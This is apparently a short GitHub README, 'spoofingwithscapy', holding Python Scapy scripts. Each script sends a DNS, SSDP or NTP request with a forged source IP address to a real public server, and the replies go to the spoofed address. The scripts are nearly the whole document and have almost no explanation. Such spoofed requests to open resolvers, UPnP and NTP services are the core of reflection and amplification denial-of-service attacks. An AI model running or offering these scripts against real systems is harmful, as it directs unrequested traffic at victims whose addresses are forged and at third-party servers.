# spoofingwithscapy
Some python scripts to spoof requests to services (DNS, UPnP)

## Requirements
```bash
sudo apt-get -y install python-pip
sudo pip install scapy
sudo python
```

## (Spoofed) DNS request

```python
from scapy.all import *
dnsQuery="ddosdb.org"
spoofedIPsrc="130.89.14.205"
dnsResolver1="8.8.8.8"
dnsResolver2="130.89.0.128"

spoofedDNSRequest = IP(src=spoofedIPsrc,dst=dnsResolver1)/UDP()/DNS(rd=1,qd=DNSQR(qname=dnsQuery))

sr1(spoofedDNSRequest)
````

## (Spoofed) SSDP request to discover UPnP devices

```python
from scapy.all import *
spoofedIPsrc="130.89.14.205"
SSDPserver="84.129.203.235"

payload = "M-SEARCH * HTTP/1.1\r\n" \
"HOST:"+SSDPserver+":1900\r\n" \
"ST:upnp:rootdevice\r\n" \
"MAN: \"ssdp:discover\"\r\n" \
"MX:2\r\n\r\n"

ssdpRequest = IP(src=spoofedIPsrc,dst=SSDPserver) / UDP(sport=1900, dport= 1900) / payload
sr1(ssdpRequest)
```

## (Spoofed) NTP request
```python
from scapy.all import *
spoofedIPsrc="130.89.14.205"
aNTPserver="59.188.133.225"
ntpRequest = IP(src=spoofedIPsrc,dst=aNTPserver) / UDP(dport=123,sport=50000)/("\x1b\x00\x00\x00"+"\x00"*11*4)
sr1(ntpRequest)
```
